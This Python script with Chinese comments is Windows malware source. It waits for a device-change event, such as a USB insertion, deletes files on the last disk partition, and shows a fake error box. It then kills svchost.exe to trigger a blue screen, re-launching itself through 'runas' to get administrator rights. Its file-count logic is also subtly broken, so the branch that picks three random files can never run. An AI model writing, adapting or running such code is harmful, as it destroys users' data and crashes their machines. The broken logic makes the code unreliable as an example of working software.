# 导包
import ctypes
import os
import sys
from random import randint

import XiaoMing
import psutil
import win32api
import win32con
import win32gui

# 用来生成日志


class Start():# 创建一个开始类
    def create_window(self):
        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = self.print_out
        wc.lpszClassName = 'Demo'
        wc.hInstance = win32api.GetModuleHandle(None)
        class_atom = win32gui.RegisterClass(wc)
        return win32gui.CreateWindow(class_atom, 'Demo', 0, 0, 0, 0, 0, 0, 0, wc.hInstance, None)
    def print_out(self, hwnd: int, msg: int, wparam: int, lparam: int):# 对消息进行处理
        if msg != win32con.WM_DEVICECHANGE:
            Msg = 'No'
            return 0
        Msg = 'Yes'
        self.Main()
    def Main(self,msg=0) -> int | str:# 发作
        # 获得盘符
        Drive_list = psutil.disk_partitions()
        Drive = Drive_list[-1][1]
        # 列举出所有文件
        All_FileS = os.listdir(Drive)
        Long_FIles = len(All_FileS)
        # 防止没文件
        if Long_FIles <= 1:
            # 如果文件小于三个，全删，若果大于三个随机选三个删
            if Long_FIles <= 3:
                for File_NaMe in All_FileS:
                    # 拼接路径
                    Path = os.path.join(Drive,File_NaMe)
                    # 删除文件
                    XiaoMing.delete(Path)
            else:
                All_FileS = XiaoMing.random_list_select(All_FileS,3)
                for File_NaMe in All_FileS:
                    # 拼接路径
                    Path = os.path.join(Drive,File_NaMe)
                    # 删除文件
                    XiaoMing.delete(Path)
        win32api.MessageBox(0,"未知错误",'Error',win32con.MB_OK | win32con.MB_ICONWARNING)# 弹出提示窗口
        self.admin_kill_exe('svchost.exe')# 杀掉关键进程【蓝屏】
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    def admin_kill_exe(self,name) -> str:# 以管理员身份杀掉进程
        if self.is_admin():
            # 杀掉名字为xxx的进程
            os.system(f"taskkill /im {name} /f")
        else:
            if sys.version_info[0] == 3:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)


if __name__ == '__main__':
    start = Start()
    start.create_window()
    win32gui.PumpMessages()
